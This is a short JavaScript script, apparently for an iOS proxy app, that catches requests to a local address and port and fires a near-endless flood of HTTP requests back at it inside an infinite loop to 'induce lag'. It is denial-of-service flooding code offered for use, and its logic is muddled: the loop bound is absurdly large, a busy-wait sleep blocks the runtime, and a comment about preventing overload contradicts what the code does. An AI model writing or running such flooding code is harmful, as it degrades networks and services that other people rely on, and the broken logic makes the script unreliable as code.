// Define the URL pattern to listen for the specific IP and port
const urlPattern = /^http:\/\/192\.168\.0\.121:8080\/$/;

// Function to handle the HTTP request and induce lag
function onRequest(request) {
    // Infinite loop to create extreme lag by continuously matching the URL and generating traffic
    while (true) {
        // Check if the request URL matches the specified pattern
        if (urlPattern.test(request.url)) {
            // Show a notification on iOS
            $notification.post("URL Matched - Intense Lagging", "Generating extreme traffic to induce lag", request.url);

            // Create a massive flood of network traffic
            for (let i = 0; i < 1000000000000000000000000; i++) {  // Increase the number of requests significantly
                // Asynchronously send requests in parallel
                $httpClient.get(request.url, function(error, response, data) {
                    // Intentionally doing nothing with the response, just generating traffic
                });
            }
        }
            // Sleep for 1 minute between each batch to prevent network overload
            sleep(60000);  // 60000ms = 1 minute
    }
}

// Simulate sleep/delay function (optional)
function sleep(ms) {
    const start = Date.now();
    while (Date.now() - start < ms) {
        // Busy wait
    }
}

// Attach the function to handle the HTTP request event
onRequest($request);
